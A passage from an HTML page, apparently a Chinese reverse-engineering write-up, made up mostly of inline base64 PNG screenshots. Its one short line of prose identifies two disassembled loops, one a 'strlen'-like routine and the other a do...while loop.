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'/><br>发现两处汇编循环，观察寄存器和堆栈数据得知上面的是“strlen”函数对应的操作<br>下面的便是<code>do...While</code>循环<br><img src='data:img/jpg;base64,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
